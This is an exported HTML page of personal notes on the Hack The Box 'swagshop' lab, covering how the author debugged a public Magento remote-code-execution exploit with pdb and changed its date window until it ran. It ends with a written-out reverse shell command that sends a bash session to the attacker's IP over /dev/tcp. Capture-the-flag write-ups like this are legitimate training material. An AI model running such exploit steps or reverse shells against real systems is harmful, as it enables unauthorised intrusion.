<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>burp/debug</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><strong>Index</strong></p>
<p><a href="HacktheBox--Linux_Boxes--swagshop.html">swagshop</a></p>

<ol>
<li><a href="HacktheBox--Linux_Boxes--swagshop--nmap.html">nmap</a></li>
<li><a href="HacktheBox--Linux_Boxes--swagshop--http.html">http</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--swagshop--http--magento_scanner_OSI.html">magento scanner OSI</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--swagshop--http--magento_scanner_OSI--magescan.phar_usage.html">magescan.phar usage</a></li>
<li><a href="HacktheBox--Linux_Boxes--swagshop--http--magento_scanner_OSI--report.html">report</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--swagshop--http--magento_scanner_OSI--report--index.php-rss-order-NEW-new.html">index.php/rss/order/NEW/new</a></li>
<li><a href="HacktheBox--Linux_Boxes--swagshop--http--magento_scanner_OSI--report--app-etc-local.xml.html">app/etc/local.xml </a></li>
<li><a href="HacktheBox--Linux_Boxes--swagshop--http--magento_scanner_OSI--report---shell.html">/shell</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--swagshop--http--magento_scanner_OSI--searchsploit.html">searchsploit</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--swagshop--http--magento_scanner_OSI--searchsploit--Remote_Code_execution_credential_injection.html">Remote Code execution credential injection</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--swagshop--http--magento_scanner_OSI--searchsploit--Remote_Code_execution_credential_injection--run.html">run</a></li>
</ol>
</ol>
</ol>
</ol>
<li><a href="HacktheBox--Linux_Boxes--swagshop--initial_foothold.html">initial foothold</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--swagshop--initial_foothold--running_code_exec.py.html">running code_exec.py</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--swagshop--initial_foothold--running_code_exec.py--burp-debug.html">burp/debug</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Linux_Boxes--swagshop--priv_esc.html">priv esc</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--swagshop--priv_esc--alt_privesc.html">alt privesc</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--swagshop--user-root.html">user/root</a></li>
<li><a href="HacktheBox--Linux_Boxes--swagshop--lessons_learned.html">lessons learned</a></li>
</ol></div>
<div class="page"><h1><b><u>burp/debug</u></b></h1><span style="color:#24ff00;">lets start with a simple </span><span style="color:#ffa500;">whoami</span><span style="color:#24ff00;"> cmd</span><br /><img src="images/1027-1.png" alt="images/1027-1.png" /><span style="color:#24ff00;"><br /><br /></span><img src="images/1027-2.png" alt="images/1027-2.png" /><img src="images/1027-3.png" alt="images/1027-3.png" /><br /><br />we see the code isn't getting past the GET before erroring out, and looking at the exploit, the target variable doesn't add the correct exploit URL to the argument so we have to adjust our <span style="color:#ffa500;">target</span><span style="color:#24ff00;"> parameter to the admin page </span><img src="images/1027-4.png" alt="images/1027-4.png" /><br /><br /><br />after that i got a strange <span style="color:#ff0000;">error</span><span style="color:#24ff00;"> </span><span style="color:#ffff00;">ippsec</span><span style="color:#24ff00;"> didn't come accross that showed more than one control was taking up my username variable<br /></span><img src="images/1027-5.png" alt="images/1027-5.png" /><br /><br />but after some research it turns out the username was being called twice<br /><img src="images/1027-6.png" alt="images/1027-6.png" /><br />commenting this line out fixed the ambiguity error<br /><br /><img src="images/1027-7.png" alt="images/1027-7.png" /><br /><br />looks like were going to have to debug the code from here, ippsec puts a <span style="color:#ffa500;">break</span><span style="color:#24ff00;"> in the code using </span><span style="color:#ffa500;">pdb</span><br /><img src="images/1027-8.png" alt="images/1027-8.png" /><br /><br /><img src="images/1027-9.png" alt="images/1027-9.png" /><br /><br />then when we run the code <span style="color:#ffa500;">pdb.set_trace() </span><span style="color:#24ff00;">lets us check what is stored in our tunnel variable<br /></span><img src="images/1027-10.png" alt="images/1027-10.png" /><img src="images/1027-11.png" alt="images/1027-11.png" /><br /><br />and there's <span style="color:#ff0000;">nothing</span><span style="color:#24ff00;"> stored in our tunnel variable, but why? the code developer mentioned that the date in the </span><span style="color:#ffa500;">local.xml </span><span style="color:#24ff00;">file had to be as recent as possible, so maybe it's not recent enough?<br /><br /><br /></span><img src="images/1027-12.png" alt="images/1027-12.png" /><br />the request code shows the period of time needs to be <span style="color:#ffff00;">7d</span><span style="color:#24ff00;"> within the date_issued variable, but what happens when we set it to </span><span style="color:#ffff00;">2years</span><span style="color:#24ff00;"> instead to extend the grace period?<br /></span><img src="images/1027-13.png" alt="images/1027-13.png" /><br /><br /><img src="images/1027-14.png" alt="images/1027-14.png" /><br />tunnel now has an object attached to it and continuing the program gives us:<br /><br />lets try <span style="color:#ffa500;">whoami</span><br /><img src="images/1027-15.png" alt="images/1027-15.png" /><br /><span style="color:#ffff00;">www-data</span><span style="color:#24ff00;"> gets returned! we have code execution!<br /><br />now run our reverse shell and...<br /></span><span style="color:#ffa500;">python code_exec.py http://10.10.10.140/index.php/admin 'bash -i "bash -c &gt;&amp; /dev/tcp/10.10.14.62/9001 0&gt;&amp;1"'</span><br /><img src="images/1027-16.png" alt="images/1027-16.png" /><br /><img src="images/1027-17.png" alt="images/1027-17.png" /><br />a shell!!<br /></div></div>
</body></html>